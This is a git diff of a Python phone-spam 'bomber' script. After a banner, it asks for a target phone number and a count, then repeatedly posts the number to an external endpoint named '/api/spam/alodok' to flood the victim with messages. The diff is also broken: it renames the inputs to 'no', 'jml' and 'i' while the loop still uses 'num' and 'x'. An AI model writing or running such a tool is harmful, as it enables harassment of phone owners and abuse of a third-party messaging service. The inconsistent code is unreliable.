@@ -28,11 +28,8 @@ a,m,h,k,b,u,c,p,bn,o = [
 '\033[0m'
 ]
 
-
-os.system('clear')
-banner = """
-
-
+os.system("clear")
+banner= """
                   [ WELCOME TO PROGRAM ]
 
                        |-DemoNZxx-|
@@ -41,12 +38,19 @@ banner = """
 \033[31m | [X]  TEAM    : XXXXX                        |
 \033[37m[•]───────────────────────────────────────────[•]"""
 
+os.system('clear')
+print (banner)
+print ('%s[%s+%s] %sIP Kamu %s: %s%s' % (p,h,p,k,m,h,ip))
+no = input('\n\033[37m[\033[31m•\033[37m] \033[31mex \033[37m: \033[31m08xx\n\033[37m[\033[32m+\033[37m] \033[31mPhone\033[37m:\033[32m ')
+if no =='':
+   exit('\033[37m[\033[31m!\033[37m] Dont be empty ')
+elif len(no) <= 9:
+   exit('\033[37m[\033[31m!\033[37m] Invalid number ')
+else:
+   jml = int(input('\n\033[37m[\033[32m+\033[37m] \033[31mAmount\033[37m:\033[32m '))
 
-num=input("[In] \033[31mNumber \033[37m: ")
-jum=int(input("[In] \033[31mAmount \033[37m: "))
-
-print("\n[RESULT]")
-for x in range(jum):
+print("\n\033[31m[\033[31m!\033[31m] \033[37mRESULT ..\n")
+for i in range(jml):
 	try:
 		req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok",
 			data={"number":num})
@@ -56,3 +60,5 @@ for x in range(jum):
 			print(f"{x+1}. Failed {num}")
 	except Exception as e:
 		print(f"{x+1}. Pass: {e}")
+
+print ('\n\033[37m[\033[35m✓\033[37m] \033[33mDONE... \033[31m>.<')
